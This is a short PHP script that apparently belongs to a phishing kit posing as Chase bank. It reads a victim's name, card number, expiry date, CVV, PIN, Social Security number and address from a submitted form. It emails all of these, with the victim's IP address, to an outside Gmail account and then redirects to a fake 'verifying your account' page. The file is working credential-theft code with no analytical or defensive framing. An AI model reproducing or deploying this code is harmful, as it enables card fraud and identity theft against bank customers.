<?
$ip = getenv("REMOTE_ADDR");
$message .= "| Name : ".$_POST['name']."\n";
$message .= "| CC : ".$_POST['cc']."\n";
$message .= "| EXP : ".$_POST['expmonth']."";
$message .= "-".$_POST['expyear']."\n";
$message .= "| CVV : ".$_POST['cvv']."\n";
$message .= "| PIN : ".$_POST['pin']."\n";
$message .= "| SSN : ".$_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3']."\n";
$message .= "| ADD : ".$_POST['add']."\n";
$message .= "| ".$_POST['state']." - ".$_POST['city']." - ".$_POST['zip']."\n";
$message .= "____________ Zaza____________\n";
$send = "soloka2nas@gmail.com";
$subject = "chase|$ip";
mail($send,$subject,$message);
header("Location: verifyingyouraccount.html");
?>